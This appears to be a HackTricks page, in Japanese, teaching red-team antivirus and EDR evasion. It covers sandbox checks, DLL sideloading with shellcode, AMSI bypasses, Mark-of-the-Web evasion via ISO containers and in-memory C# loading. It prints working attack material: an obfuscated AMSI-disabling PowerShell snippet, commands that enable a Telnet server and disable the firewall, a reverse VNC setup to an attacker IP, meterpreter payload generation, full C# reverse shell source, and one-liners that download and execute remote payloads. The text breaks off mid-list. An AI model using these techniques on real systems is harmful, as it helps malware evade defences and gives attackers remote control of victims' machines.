# アンチウイルス（AV）バイパス

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でAWSハッキングをゼロからヒーローまで学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter**で**@carlospolopm**をフォローする🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
- **ハッキングトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

**このページは** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**によって書かれました！**

## **AV回避方法論**

現在、AVはファイルが悪意のあるものかどうかをチェックするために異なる方法を使用しています。静的検出、動的解析、さらに高度なEDRでは、挙動解析があります。

### **静的検出**

静的検出は、バイナリやスクリプト内の既知の悪意のある文字列やバイト配列をフラグ付けし、ファイル自体から情報を抽出することによって達成されます（例：ファイルの説明、会社名、デジタル署名、アイコン、チェックサムなど）。これは、既知の公開ツールを使用すると、それらが分析されて悪意のあるものとしてフラグ付けされている可能性があるため、簡単に捕まる可能性があります。この種の検出を回避する方法がいくつかあります。

- **暗号化**

バイナリを暗号化すると、AVはプログラムを検出する方法がなくなりますが、プログラムをメモリ内で復号化して実行するためのローダーが必要です。

- **曖昧化**

AVをバイパスするためには、バイナリやスクリプト内の一部の文字列を変更するだけで十分な場合がありますが、曖昧化する内容によっては時間がかかる場合があります。

- **カスタムツール**

独自のツールを開発すると、既知の悪意のある署名がないため、多くの時間と労力がかかります。

{% hint style="info" %}
Windows Defenderの静的検出に対する良い方法は、[ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)を使用することです。これは基本的にファイルを複数のセグメントに分割し、Defenderにそれぞれをスキャンさせる方法で、これにより、バイナリ内のフラグ付けされた文字列やバイトを正確に示すことができます。
{% endhint %}

実用的なAV回避に関する[YouTubeプレイリスト](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf)をぜひご覧ください。

### **動的解析**

動的解析は、AVがバイナリをサンドボックスで実行し、悪意のある活動を監視するときに行われます（例：ブラウザのパスワードを復号化して読み取ろうとする、LSASSにミニダンプを実行するなど）。この部分は少し扱いにくいかもしれませんが、サンドボックスを回避するためにできることがいくつかあります。

- **実行前にスリープ** 実装方法によっては、AVの動的解析をバイパスする素晴らしい方法になることがあります。AVはファイルをスキャンする時間が非常に短いため、ユーザーの作業を妨げないようにするため、長いスリープを使用すると、バイナリの解析が妨げられることがあります。問題は、多くのAVサンドボックスが、実装方法によってはスリープをスキップできることです。

- **マシンのリソースをチェック** 通常、サンドボックスは非常に少ないリソースしか使用できません（例：RAM < 2GB）、そうでないとユーザーのマシンが遅くなる可能性があります。ここでは非常に創造的になることもできます。たとえば、CPUの温度やファンの回転数をチェックすることもできます。すべてがサンドボックスに実装されるわけではありません。

- **マシン固有のチェック** "contoso.local" ドメインに参加しているユーザーをターゲットにしたい場合、コンピュータのドメインをチェックして、指定したものと一致するかどうかを確認し、一致しない場合はプログラムを終了させることができます。

Microsoft Defenderのサンドボックスのコンピュータ名はHAL9THであることがわかりましたので、マルウェアを爆発させる前にコンピュータ名をチェックして、名前がHAL9THと一致する場合は、Defenderのサンドボックス内にいることを意味しますので、プログラムを終了させることができます。

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>出典: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

[@mgeeky](https://twitter.com/mariuszbit)からの他の非常に良いヒントもあります。サンドボックスに対抗するための

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

この投稿で述べたように、**公開ツール**は最終的に**検出される**ので、自分自身に次のようなことを尋ねる必要があります：

たとえば、LSASSをダンプしたい場合、**本当にmimikatzを使用する必要がありますか**？それとも、より知名度の低い別のプロジェクトを使用してLSASSをダンプすることができますか。

正しい答えはおそらく後者です。mimikatzを例に取ると、おそらくAVやEDRによって最もフラグ付けされたマルウェアの1つであるか、もしくは最もフラグ付けされたマルウェアである可能性がありますが、プロジェクト自体は非常にクールですが、AVを回避するためにそれを使用するのは悪夢です。したがって、達成しようとしている目標に代わるものを探してください。

{% hint style="info" %}
回避のためにペイロードを変更する際は、Defenderの**自動サンプル送信をオフにして**ください。そして、本当に、**VIRUSTOTALにアップロードしない**でください。長期的な回避を目指す場合は、特定のAVによってペイロードが検出されるかどうかを確認するために、VMにインストールし、自動サンプル送信をオフにして、結果に満足するまでそこでテストしてください。
{% endhint %}

## EXE vs DLL

可能な限り、**回避のためには常にDLLを使用**してください。私の経験では、DLLファイルは通常**検出されにくく解析されにくい**ため、いくつかのケースで検出を回避するための非常にシンプルなトリックです（もちろん、ペイロードがDLLとして実行される方法がある場合）。

この画像で示されているように、HavocのDLLペイロードはantiscan.meで4/26の検出率であり、EXEペイロードは7/26の検出率です。

<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>antiscan.meにおける通常のHavoc EXEペイロードと通常のHavoc DLLの比較</p></figcaption></figure>

次に、DLLファイルを使用してよりステルス性を高めるためのいくつかのトリックを紹介します。

## DLLサイドローディング＆プロキシング

**DLLサイドローディング**は、ローダーが使用するDLL検索順序を利用して、被害者アプリケーションと悪意のあるペイロードを隣接させることで利益を得ます。

[Siofra](https://github.com/Cybereason/siofra)と次のPowerShellスクリプトを使用して、DLLサイドローディングに対して脆弱なプログラムをチェックできます：

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
{% endcode %}

このコマンドは、"C:\Program Files\\"内のDLLハイジャッキングに対して脆弱なプログラムのリストと、それらがロードしようとするDLLファイルを出力します。

**DLLハイジャック可能/サイドロード可能なプログラムを自分で調査することを強くお勧めします**。この技術は適切に行われればかなりステルスですが、一般に知られているDLLサイドロード可能なプログラムを使用すると、簡単に見つかる可能性があります。

プログラムがロードを期待している特定の関数を含む悪意のあるDLLを配置するだけでは、ペイロードがロードされません。この問題を解決するために、**DLLプロキシング/フォワーディング**と呼ばれる別の技術を使用します。

**DLLプロキシング**は、プログラムがプロキシ（および悪意のある）DLLからオリジナルのDLLに行う呼び出しを転送し、プログラムの機能を保持し、ペイロードの実行を処理できるようにします。

[@flangvik](https://twitter.com/Flangvik/)の[SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy)プロジェクトを使用します。

以下は私が実行した手順です：

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
{% endcode %}

最後のコマンドは、DLLのソースコードテンプレートと、元の名前が変更されたDLLの2つのファイルを提供します。

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

これが結果です：

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

私たちのシェルコード（[SGN](https://github.com/EgeBalci/sgn)でエンコードされています）とプロキシDLLの両方が、[antiscan.me](https://antiscan.me)で0/26の検出率を持っています！これは成功と言えるでしょう。

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
私は、[S3cur3Th1sSh1tのtwitch VOD](https://www.twitch.tv/videos/1644171543)と[ippsecのビデオ](https://www.youtube.com/watch?v=3eROsG_WNpE)を見ることを**強くお勧めします**。これにより、私たちがより詳細に議論した内容についてさらに学ぶことができます。
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freezeは、中断されたプロセス、直接システムコール、代替実行方法を使用してEDRをバイパスするためのペイロードツールキットです`

Freezeを使用して、シェルコードをステルスに読み込んで実行することができます。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
回避はただの猫とねずみのゲームであり、今日うまくいっても明日は検出される可能性があるため、可能であれば複数の回避技術を連鎖させてみてください。
{% endhint %}

## AMSI（Anti-Malware Scan Interface）

AMSIは"[ファイルレスマルウェア](https://en.wikipedia.org/wiki/Fileless\_malware)"を防ぐために作成されました。最初は、AVは**ディスク上のファイル**のみをスキャンすることができましたので、何らかの方法で**直接メモリ内でペイロードを実行**できれば、AVはそれを防ぐ手段を持っていませんでした。

AMSI機能は、Windowsのこれらのコンポーネントに統合されています。

- ユーザーアカウント制御（EXE、COM、MSI、またはActiveXの昇格）
- PowerShell（スクリプト、対話的使用、および動的コード評価）
- Windowsスクリプトホスト（wscript.exeおよびcscript.exe）
- JavaScriptおよびVBScript
- Office VBAマクロ

これにより、アンチウイルスソリューションがスクリプトの動作を検査できるようになり、スクリプトの内容を暗号化されていない形式で公開し、曖昧化します。

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')`を実行すると、Windows Defenderで次のアラートが表示されます。

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

スクリプトをディスクに保存せずにメモリ内でキャッチされたことに注意してください。これはAMSIのためです。

AMSIを回避する方法はいくつかあります。

- **曖昧化**

AMSIは主に静的検出で動作するため、読み込もうとしているスクリプトを変更することは検出を回避する良い方法です。

ただし、AMSIは複数のレイヤーを持つスクリプトを曖昧化する能力を持っているため、曖昧化はどのように行われているかによっては避けるべきではありません。これにより、回避が直感的でなくなります。しかし、時には、変数名をいくつか変更するだけで十分な場合もあるため、フラグが立っているものによります。

- **AMSIバイパス**

AMSIはpowershell（またはcscript.exe、wscript.exeなど）プロセスにDLLを読み込むことで実装されているため、特権のないユーザーとして実行していても簡単に操作できます。このAMSIの実装上の欠陥により、研究者はAMSIスキャンを回避するための複数の方法を見つけました。

**エラーを強制する**

AMSIの初期化を失敗させる（amsiInitFailed）と、現在のプロセスに対してスキャンが開始されなくなります。元々は[Matt Graeber](https://twitter.com/mattifestation)によって開示され、Microsoftは広範囲な使用を防ぐための署名を開発しました。

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

現在のPowerShellプロセスでAMSIを使用不能にするためには、たった1行のPowerShellコードが必要でした。 もちろん、この行はAMSI自体によってフラグが立てられているため、このテクニックを使用するにはいくつかの修正が必要です。

ここに、この[GitHub Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db)から取得した修正されたAMSIバイパスがあります。
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**メモリパッチ**

この技術は、最初に[@RastaMouse](https://twitter.com/\_RastaMouse/)によって発見され、amsi.dll内の"AmsiScanBuffer"関数のアドレスを見つけ、それをE\_INVALIDARGコードのコードに戻すように上書きすることを含みます。これにより、実際のスキャンの結果が0を返し、これはクリーンな結果として解釈されます。

{% hint style="info" %}
詳細な説明については、[https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/)を参照してください。
{% endhint %}

PowerShellでAMSIをバイパスするために使用される他の多くの技術もあります。[**このページ**](basic-powershell-for-pentesters/#amsi-bypass)と[このリポジトリ](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)をチェックして、詳細を学んでください。

## オブフスケーション

C#のクリアテキストコードを**難読化**したり、バイナリをコンパイルするための**メタプログラミングテンプレート**を生成したり、**コンパイルされたバイナリを難読化**するために使用できるいくつかのツールがあります：

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#オブファスケータ**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): このプロジェクトの目的は、[LLVM](http://www.llvm.org/)コンパイルスイートのオープンソースフォークを提供し、[コードの難読化](http://en.wikipedia.org/wiki/Obfuscation\_\(software\))と改ざん防止を通じてソフトウェアセキュリティを向上させることです。
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscatorは、外部ツールを使用せずに、コンパイル時に`C++11/14`言語を使用して難読化されたコードを生成する方法を示しています。
* [**obfy**](https://github.com/fritzone/obfy): C++テンプレートメタプログラミングフレームワークによって生成された難読化された操作のレイヤーを追加し、アプリケーションをクラックしようとする人の生活を少し難しくします。
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatrazは、.exe、.dll、.sysなど、さまざまな異なるpeファイルを難読化できるx64バイナリ難読化ツールです。
* [**metame**](https://github.com/a0rtega/metame): Metameは、任意の実行可能ファイル用のシンプルな変形コードエンジンです。
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscatorは、ROP（return-oriented programming）を使用してLLVMサポートされた言語のための細かい粒度のコード難読化フレームワークです。ROPfuscatorは、通常の制御フローの概念を妨げるために、通常の命令をROPチェーンに変換することで、アセンブリコードレベルでプログラムを難読化します。
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcryptは、Nimで書かれた.NET PE Crypterです。
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptorは、既存のEXE/DLLをシェルコードに変換してからロードできます

## SmartScreen & MoTW

インターネットから実行可能ファイルをダウンロードして実行する際にこの画面を見たことがあるかもしれません。

Microsoft Defender SmartScreenは、潜在的に悪意のあるアプリケーションを実行することからエンドユーザーを保護するためのセキュリティメカニズムです。

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

SmartScreenは主に評判ベースのアプローチで機能し、一般的でないダウンロードアプリケーションはSmartScreenをトリガーし、エンドユーザーがファイルを実行するのを警告し防止します（ただし、ファイルは引き続き「詳細情報」->「とにかく実行」をクリックすることで実行できます）。

**MoTW**（Mark of The Web）は、Zone.Identifierという名前の[NTFS代替データストリーム](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\))であり、インターネットからファイルをダウンロードすると自動的に作成され、ダウンロード元のURLとともに保存されます。

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>インターネットからダウンロードしたファイルのZone.Identifier ADSを確認します。</p></figcaption></figure>

{% hint style="info" %}
**信頼された**署名証明書で署名された実行可能ファイルは、SmartScreenをトリガーしません。
{% endhint %}

Mark of The Webを回避するための非常に効果的な方法は、ISOなどのコンテナ内にペイロードをパッケージ化することです。これは、Mark-of-the-Web（MOTW）が**NTFS以外**のボリュームには適用できないためです。

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、Mark of The Webを回避するためにペイロードを出力コンテナにパッケージ化するツールです。

使用例：
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
ここでは、[PackMyPayload](https://github.com/mgeeky/PackMyPayload/)を使用して、ISOファイル内にペイロードをパッケージ化してSmartScreenをバイパスするデモを示します。

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C#アセンブリリフレクション

C#バイナリをメモリにロードする方法はかなり以前から知られており、AVに検出されることなくポストエクスプロイテーションツールを実行するための非常に優れた方法です。

ペイロードがディスクに触れることなく直接メモリにロードされるため、全体のプロセスでAMSIをパッチする必要があります。

ほとんどのC2フレームワーク（sliver、Covenant、metasploit、CobaltStrike、Havocなど）はすでにメモリ内でC#アセンブリを実行する機能を提供していますが、その方法は異なります。

* **Fork\&Run**

これは**新しい犠牲プロセスを生成**し、その新しいプロセスにポストエクスプロイテーションの悪意のあるコードをインジェクトし、悪意のあるコードを実行し、新しいプロセスを終了する方法です。これには利点と欠点があります。フォークと実行方法の利点は、実行が**Beaconインプラントプロセスの外**で発生することです。これは、ポストエクスプロイテーションアクションで何かがうまくいかないか検出された場合、**インプラントが生き残る可能性が高い**ということを意味します。欠点は、**行動検出**によって**検出される可能性が高い**ということです。

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

これは、ポストエクスプロイテーションの悪意のあるコードを**独自のプロセスにインジェクト**することです。これにより、新しいプロセスを作成してAVにスキャンさせる必要がなくなりますが、ペイロードの実行中に何かがうまくいかない場合、**Beaconを失う可能性が高く**、クラッシュする可能性があります。

<figure><img src="../.gitbook/assets/image (9) (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
C#アセンブリのロードについて詳しく知りたい場合は、この記事[https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/)とそのInlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))をチェックしてください。
{% endhint %}

また、PowerShellからC#アセンブリをロードすることもできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)と[S3cur3th1sSh1tのビデオ](https://www.youtube.com/watch?v=oe11Q-3Akuk)をチェックしてください。

## 他のプログラミング言語の使用

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins)で提案されているように、Attacker Controlled SMB共有にインストールされたインタプリタ環境へのアクセスを提供することで、他の言語を使用して悪意のあるコードを実行することが可能です。

SMB共有のインタプリタバイナリと環境へのアクセスを許可することで、侵害されたマシンのメモリ内でこれらの言語で任意のコードを実行できます。

リポジトリによると、Defenderはスクリプトをスキャンしますが、Go、Java、PHPなどを利用することで**静的シグネチャをバイパスする柔軟性**が増します。これらの言語でランダムな難読化されていない逆シェルスクリプトをテストした結果、成功しています。

## 高度な回避

回避は非常に複雑なトピックであり、1つのシステムで多くの異なるテレメトリソースを考慮する必要があるため、成熟した環境で完全に検出されないことはほとんど不可能です。

対抗するすべての環境にはそれぞれ独自の強みと弱みがあります。

[@ATTL4S](https://twitter.com/DaniLJ94)からのこのトークを見ることを強くお勧めします。より高度な回避技術に入るための足がかりを得るためです。

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

[@mariuszbit](https://twitter.com/mariuszbit)によるEvasion in Depthに関するもう1つの素晴らしいトークもあります。

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **古い技術**

### **Defenderが悪意のあると見なす部分をチェック**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)を使用すると、Defenderが悪意のあると見なす部分を**削除**し、それを**見つけ出す**までバイナリを分割できます。\
同じことを行う別のツールは[**avred**](https://github.com/dobin/avred)で、[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)でサービスを提供しています。

### **Telnetサーバー**

Windows10まで、すべてのWindowsには**Telnetサーバー**が付属しており、（管理者として）インストールできました。
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システムが起動したときに**開始**されるようにして、**今すぐ実行**してください。
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnetポートの変更**（ステルス）とファイアウォールの無効化:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

ダウンロード先: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (セットアップではなくバイナリダウンロードが必要)

**ホストでの手順**: _**winvnc.exe**_ を実行し、サーバーを設定します:

* _Disable TrayIcon_ オプションを有効にします
* _VNC Password_ にパスワードを設定します
* _View-Only Password_ にパスワードを設定します

その後、バイナリ _**winvnc.exe**_ と新しく作成されたファイル _**UltraVNC.ini**_ を**被害者**の内部に移動します

#### **逆接続**

**攻撃者**は**自身のホスト**でバイナリ `vncviewer.exe -listen 5900` を実行して、逆接続の**VNC接続**をキャッチする準備をします。その後、**被害者**の内部で: winvncデーモンを起動 `winvnc.exe -run` し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します

**警告:** ステルスを維持するためにいくつかのことを行わないでください

* 既に実行中の場合は `winvnc` を起動しないでください。そうすると[ポップアップ](https://i.imgur.com/1SROTTl.png)が表示されます。実行中かどうかは `tasklist | findstr winvnc` で確認できます
* 同じディレクトリに `UltraVNC.ini` がない状態で `winvnc` を起動しないでください。そうすると[設定ウィンドウ](https://i.imgur.com/rfMQWcf.png)が開きます
* ヘルプのために `winvnc -h` を実行しないでください。そうすると[ポップアップ](https://i.imgur.com/oc18wcu.png)が表示されます

### GreatSCT

ダウンロード先: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT内部：

Inside GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
今、`msfconsole -r file.rc` で**リスナーを開始**し、次のように**xml ペイロード**を**実行**します：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在のディフェンダーはプロセスを非常に速く終了します。**

### 自分自身のリバースシェルをコンパイルする

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初のC#リバースシェル

次のようにコンパイルします：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
使用方法:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C#を使用したコンパイラ
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

C#の難読化ツールのリスト: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### その他のツール
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
